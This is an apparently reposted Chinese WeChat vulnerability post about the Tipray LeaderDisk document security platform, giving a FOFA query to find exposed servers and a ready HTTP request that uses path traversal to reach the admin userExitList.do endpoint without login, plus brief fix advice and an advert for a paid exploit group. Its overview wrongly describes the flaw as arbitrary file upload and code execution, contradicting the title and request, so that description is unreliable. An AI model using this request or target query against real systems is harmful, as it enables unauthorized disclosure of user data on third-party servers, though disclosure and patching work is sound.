---
title: 天锐绿盘文档安全管理平台userExitList存在信息泄露漏洞
url: https://mp.weixin.qq.com/s/9eDO8xuhyTrEENhtxc-d2Q
source: Doonsec's feed
date: 2026-09-08
fetch_date: 2026-09-09T06:53:48.150718
---

# 天锐绿盘文档安全管理平台userExitList存在信息泄露漏洞

# 天锐绿盘文档安全管理平台userExitList存在信息泄露漏洞

北雪网络安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

**本文章所描述的内容仅供网络安全学习使用，任何人不允许学到技术内容进行非法系统测试，作者不对任何学习文章并进行非法操作的行为负责，由本人自己承担后果，本文章仅供技术学习。**

01

更多内容

#### 网络安全学习知识库每日添加最新漏洞并提供python与 nuclei 批量探测脚本：https://pc.fenchuan8.com/#/index?forum=110296

02

搜索引擎

fofa：body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk"

03

漏洞复现

漏洞概述：天锐绿盘云文档安全管理 userExitList.do 接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjYva86ibfzdE2wvnnm8wmY83oab6XvsDOPk5gTELxlO1fVM7r0kTQ5aKqFt5TPdE3fX8n20dicDjPt1hhhXDk8zsTTlr67QDkkk/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSziaKIbDibib3CqB5GzXafyhbewicgliaU63v1SFw78FlaPHfYH0kBBSPqAqvBsh9cx3rZOdJX7iariccxHRfTfEbhlULnlOYBk5TybRHc/640?wx_fmt=png&from=appmsg)

```
POST /lddsm/service/../admin/user/userExitList.do?userNames=sysadmin HTTP/1.1Host: {{Hostname}}User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestConnection: close
_search=false&nd=1763012062514&rows=100&page=1&sidx=usr_name&sord=asc
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzj4w1iazCqNH4BPfLCDOiaH4wacDgIqw2nbD4c16aVTKvicM1eSljwlZscmWRTobVhlq506ibF3iayHAZz4aueL7nUUibOvYVdmHNO6g/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgtLicKvRQ4Sd7rxHCaSTfFSSsBVQEiaB03ic3YYvlctC1vnicvZ3ib4pibQht5GfjSI14A0oKNUl1QziccxHGnoRcfGZm2lFgem3KNfM/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzhnP0flgTib8ehCjFQ99fZcn5q1RibwzeYRCT7sJSgxat2TeEiaXqnm39JYspn6h3w0lpM0CAEBQ0NJ1rNTOsldxo2WMLoTSickztI/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzia2pbQXg4ggHYJU1YwuiarnojrAoS3cheJRrXerhdQo0uDPrFPtDE0rb3BxzY3xx9lWLtsk9u86M81tfFdlQyXaKXWYDbq6Pp2k/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzhTpwhVExIyiajTae6cBibWVb6ibibN7pKRCYKAkw1ZSagj4UY5GMyGCfPDyKegOyKJHPwSsOTbaHunMeADPiczeXWYpoEV9JvNNPJM/640?wx_fmt=png&from=appmsg)

04

修复建议

1、关闭互联网暴露面或接口设置访问权限

2、升级至安全版本

05

内部圈子

🛠️ 【知名漏洞实战圈，纯干货】🛠️

还在找公开漏洞POC而烦恼？还在为漏洞不会验证而发愁？还在为发现不了漏洞而自卑？这里漏洞圈子解决你的困惑！
目前已更新poc数量2500+

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzhibygBQRNnzfhAQGoBE9mE6KBfhXiaicGxbOBHyCZraY3q4Tc9EIuInXnL1b0VmIhnNyQsHZanfsybckqhZQ43rWibX5V6nZTJ6mI/640?wx_fmt=png&from=appmsg)

🎯 适用场景

**▫️渗透测试**▫️企业漏洞自查****▫️****攻防演练****▫️****安全服务****▫️****合规运营****

****![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzhEUxQ40yeqISjibLYgV2PNZlMod1H4z6jDI7oypEhq5UrcFvovHeibc7bBAqtjp8ib9c5xxIp1OMialOPvicdaQuvv14dc9c1h2YJI/640?wx_fmt=png&from=appmsg)****

**▫️微信扫一扫进入付费圈子查看更多漏洞内容。**

****▫️**全民掌握网安技能，共守智能时代晴空。**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjnJSMCbXtribgZvAJkvYkoOvpBvPF0qhoF9YzA6fEqEfv9BgW7zHvsKKlzrgAFaGiaMSJk9eObsFyRqjoKl6QuVVC65jmCxZnSQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过